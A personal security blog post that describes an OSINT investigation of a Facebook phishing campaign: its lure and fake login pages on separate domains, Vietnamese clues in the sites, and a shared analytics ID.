&lt;h1 id="i-was-just-curious-i-swear"&gt;I was just curious, I swear!&lt;/h1&gt;
&lt;p&gt;I wanted to see the phishing site for myself but I was unlucky and did not get tagged by anyone. So I reached out to people who did and I eventually got to this page shown below:&lt;/p&gt;
&lt;p&gt;&lt;img alt="checking-the-fb-phishing-site-01" src="https://www.accidentalrebel.com/images/checking-the-fb-phishing-site-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;To a trained eye, one could easily see the obvious red flags. But how can one notice them if there is a very attention-catching image in the middle beckoning to be clicked? It's a very simple tactic yet very effective. Clicking this link leads to an external website with an even more tantalizing image masquerading as a video. &lt;/p&gt;
&lt;p&gt;&lt;img alt="checking-the-fb-phishing-site-03" src="https://www.accidentalrebel.com/images/checking-the-fb-phishing-site-03.png" /&gt;&lt;/p&gt;
&lt;p&gt;Clicking play on that video would then lead to a fake Facebook login page. We all know what's next after that. &lt;/p&gt;
&lt;p&gt;&lt;img alt="checking-the-fb-phishing-site-06" src="https://www.accidentalrebel.com/images/checking-the-fb-phishing-site-06.png" /&gt;&lt;/p&gt;
&lt;p&gt;Of course, the very best course of action when a phishing site is discovered is to report it. I, however, was curious so I decided to poke around first.&lt;/p&gt;
&lt;h1 id="the-poking-begins"&gt;The poking begins&lt;/h1&gt;
&lt;p&gt;Using my knowledge in OSINT (Open Source Intelligence) and pentesting, I poked around to see what I could learn from these set of pages.&lt;/p&gt;
&lt;p&gt;One thing that immediately became obvious was that these "set of pages" were hosted on separate domains. The page with the video points to one domain, and the login page to another (that is even protected by DDNS (Dynamic DNS) via No-IP). &lt;/p&gt;
&lt;p&gt;&lt;img alt="investigating-an-fb-phishing-site-08" src="https://www.accidentalrebel.com/images/investigating-an-fb-phishing-site-08.png" /&gt;&lt;/p&gt;
&lt;p&gt;I also noticed that the way that the two pages were built was different. The coding style is not the same, different frameworks were used, plus the robots.txt of the login page was more restrictive. &lt;/p&gt;
&lt;p&gt;Why are they in separate domains? Wouldn't it be cheaper to just have both pages on the same domain? &lt;/p&gt;
&lt;p&gt;My hunch is that maybe the two sites were made by different people. One guy made the landing page then a different one made the login page. Or maybe the login page is an out-of-the-box solution you pay for or rent if you want to set up your own phishing scam? A PhAAS (Phishing-as-a-Service)?&lt;/p&gt;
&lt;p&gt;&lt;img alt="investigating-an-fb-phishing-site-09" src="https://www.accidentalrebel.com/images/investigating-an-fb-phishing-site-09.png" /&gt;&lt;/p&gt;
&lt;p&gt;During my reconnaissance, I also noticed that the URLs for the login page were changed a few times over a few hours. It's possible that the pages were being taken down thanks to the reports and the malicious actors were just making new instances and redirecting to it to make sure that the operation continues.&lt;/p&gt;
&lt;h1 id="ang-nhap-hoac-ang"&gt;Đăng nhập hoặc đăng&lt;/h1&gt;
&lt;p&gt;Another thing I noticed is references to various Vietnamese terms and websites. Both pages have directories using the word "homnay", Vietnamese for the word "today". The source code also has a link to the news website "tuoitre.vn". &lt;/p&gt;
&lt;p&gt;&lt;img alt="checking-the-fb-phishing-site-04" src="https://www.accidentalrebel.com/images/checking-the-fb-phishing-site-04.png" /&gt;&lt;/p&gt;
&lt;p&gt;The Google Analytics ID used can also be found in previously tagged but now-defunct Phishing websites with references to Vietnam. It's entirely possible that these phishing sites initially targeted Vietnamese users but eventually got to Philippine users via the tagging spreading mechanism.&lt;/p&gt;
&lt;p&gt;&lt;img alt="checking-the-fb-phishing-site-05" src="https://www.accidentalrebel.com/images/checking-the-fb-phishing-site-05.png" /&gt;&lt;/p&gt;
&lt;p&gt;Or maybe it's a deliberate ploy to make it seem that the origin of the phish is Vietnamese. Just to throw off those of us snooping around.&lt;/p&gt;
&lt;h1 id="and-then-it-was-gone"&gt;And then it was gone&lt;/h1&gt;
&lt;p&gt;I was tempted to make a dummy Facebook account and send the login details to the phishing site. The idea was to see how long before an account gets accessed after submitting the credentials and if the tagging of friends is automated or done manually. But sadly I ran out of free time and by the time I came back to it the login page was already completely offline. The landing page is still up though.&lt;/p&gt;
&lt;p&gt;This investigation has taught me a lot about phishing sites. It's different from investigating malware but it's easy to see the similarities in intent and approaches. I might try investigating more in the future. I'm curious to find out what the usual &lt;em&gt;modus operandi&lt;/em&gt; is and also how the general populace can better protect themselves from it. &lt;/p&gt;
&lt;p&gt;This particular site may be down now, but I bet there will be more in the future. As long as there are people to fall for scams like these, this type of attack will continue.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you want to know more or discuss the details about the phishing site, I would be happy to exchange notes. Drop me a line on Twitter @accidentalrebel.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This investigation led to a more alarming follow-up: &lt;a href="https://www.accidentalrebel.com/finding-phished-passwords-on-a-scam-site.html"&gt;Finding Phished Passwords on a Scam Site&lt;/a&gt;, where I found publicly accessible victim credentials.&lt;/p&gt;</content><category term="Security"/><category term="phishing"/><category term="threat-hunting"/><category term="osint"/></entry></feed>